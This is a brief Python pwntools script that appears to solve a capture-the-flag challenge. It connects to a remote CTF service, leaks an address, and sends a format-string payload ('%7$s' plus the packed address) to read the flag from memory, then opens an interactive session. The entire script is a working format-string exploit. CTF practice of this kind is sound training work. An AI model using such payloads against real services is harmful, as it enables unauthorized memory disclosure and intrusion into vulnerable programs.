#!/usr/bin/env python3
from pwn import *

context(arch='amd64', os='linux')
#context.log_level = 'debug'

HOST = "simple-ai-bot.ctf.zone"
PORT = 4242
io = remote(HOST, PORT)

io.recvuntil(b"> ")
io.sendline(b"flag")
line = io.recvline().decode()
print (line)
dir_flag = int(line.strip().split()[-1], 16)

payload = b"%7$sAAAA"

payload += p64(dir_flag)    
print (payload)
io.sendline(payload)
io.interactive()

